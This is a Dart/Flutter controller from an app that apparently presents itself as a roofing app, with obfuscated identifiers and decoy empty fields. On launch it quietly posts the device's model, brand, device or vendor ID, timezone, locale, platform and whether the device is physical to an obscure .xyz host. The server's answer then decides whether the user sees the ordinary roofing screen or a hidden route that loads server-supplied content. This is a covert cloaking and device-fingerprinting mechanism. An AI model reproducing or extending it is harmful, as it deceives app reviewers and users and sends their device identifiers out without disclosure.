import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var xeynvfbl = RxBool(false);
  var glsuxav = RxBool(true);
  var resgf = RxString("");
  var dorris = RxBool(false);
  var wolf = RxBool(true);
  final bnecmsltzy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ruonwq();
  }


  Future<void> ruonwq() async {

    dorris.value = true;
    wolf.value = true;
    glsuxav.value = false;

    bnecmsltzy.post("https://pai.tellh662.xyz/YZ58S",data: await ckfomxyt()).then((value) {
      var gcnhdsja = value.data["gcnhdsja"] as String;
      var wnkxo = value.data["wnkxo"] as bool;
      if (wnkxo) {
        resgf.value = gcnhdsja;
        romaine();
      } else {
        torphy();
      }
    }).catchError((e) {
      glsuxav.value = true;
      wolf.value = true;
      dorris.value = false;
    });
  }

  Future<Map<String, dynamic>> ckfomxyt() async {
    final DeviceInfoPlugin ehkq = DeviceInfoPlugin();
    PackageInfo pmhtks_ntazrw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var plhukci = Platform.localeName;
    var cDjf = currentTimeZone;

    var OJzPp = pmhtks_ntazrw.packageName;
    var wajNfdP = pmhtks_ntazrw.version;
    var QNUos = pmhtks_ntazrw.buildNumber;

    var xBVQ = pmhtks_ntazrw.appName;
    var estelleBrown = "";
    var QaqdxCO  = "";
    var denisUpton = "";
    var vAnFR = "";
    var stantonKuvalis = "";
    var wilhelmSmith = "";
    var reynaKing = "";
    var JPALj = "";
    var kristyHermiston = "";
    var jackieRath = "";

    var lXdN = "";
    var roRczs = false;

    if (GetPlatform.isAndroid) {
      lXdN = "android";
      var fgerokw = await ehkq.androidInfo;

      vAnFR = fgerokw.brand;

      JPALj  = fgerokw.model;
      QaqdxCO = fgerokw.id;

      roRczs = fgerokw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lXdN = "ios";
      var gomulbhy = await ehkq.iosInfo;
      vAnFR = gomulbhy.name;
      JPALj = gomulbhy.model;

      QaqdxCO = gomulbhy.identifierForVendor ?? "";
      roRczs  = gomulbhy.isPhysicalDevice;
    }

    var res = {
      "wajNfdP": wajNfdP,
      "xBVQ": xBVQ,
      "QNUos": QNUos,
      "OJzPp": OJzPp,
      "JPALj": JPALj,
      "cDjf": cDjf,
      "QaqdxCO": QaqdxCO,
      "plhukci": plhukci,
      "lXdN": lXdN,
      "roRczs": roRczs,
      "vAnFR": vAnFR,
      "stantonKuvalis" : stantonKuvalis,
      "wilhelmSmith" : wilhelmSmith,
      "estelleBrown" : estelleBrown,
      "denisUpton" : denisUpton,
      "kristyHermiston" : kristyHermiston,
      "reynaKing" : reynaKing,
      "jackieRath" : jackieRath,

    };
    return res;
  }

  Future<void> torphy() async {
    Get.offAllNamed("/roofing_tab");
  }

  Future<void> romaine() async {
    Get.offAllNamed("/roofing_build");
  }

}
